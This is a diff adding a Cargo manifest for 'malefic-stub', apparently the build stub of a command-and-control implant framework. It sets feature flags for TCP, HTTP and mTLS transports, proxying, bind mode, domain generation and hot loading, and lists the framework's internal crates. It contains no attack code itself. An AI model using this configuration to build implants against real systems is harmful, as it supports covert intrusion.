@@ -1,0 +1,46 @@
+[package]
+name = "malefic-stub"
+version = "0.1.0"
+edition = "2021"
+
+[features]
+default = ["addon", "hot_load", "register_info", "transport_tcp"]
+
+addon = ["malefic-manager/addon"]
+hot_load = ["malefic-manager/hot_load"]
+register_info = ["malefic-common/register_info"]
+secure = ["malefic-proto/secure", "malefic-crypto/secure", "malefic-config/secure"]
+malefic-3rd = ["dep:malefic-3rd"]
+
+# Transport propagation
+transport_tcp = ["malefic-transport/transport_tcp"]
+transport_http = ["malefic-transport/transport_http"]
+transport_rem = ["malefic-transport/transport_rem"]
+bind = ["malefic-transport/bind"]
+tls = ["malefic-transport/tls"]
+tls_rustls = ["malefic-transport/tls_rustls"]
+tls_native = ["malefic-transport/tls_native"]
+mtls = ["malefic-transport/mtls"]
+proxy = ["malefic-transport/proxy"]
+dga = ["malefic-transport/dga"]
+
+[dependencies]
+anyhow = { workspace = true }
+hmac = { workspace = true }
+sha2 = { workspace = true }
+futures = { workspace = true }
+futures-timer = { workspace = true }
+
+malefic-gateway = { workspace = true }
+malefic-proto = { workspace = true }
+malefic-crypto = { workspace = true, default-features = true }
+malefic-module = { workspace = true }
+malefic-modules = { workspace = true }
+malefic-cron = { workspace = true }
+malefic-config = { workspace = true }
+malefic-common = { workspace = true, default-features = false }
+malefic-manager = { workspace = true, default-features = false }
+malefic-scheduler = { workspace = true }
+malefic-transport = { workspace = true, default-features = false }
+malefic-sysinfo = { workspace = true }
+malefic-3rd = { workspace = true, optional = true }
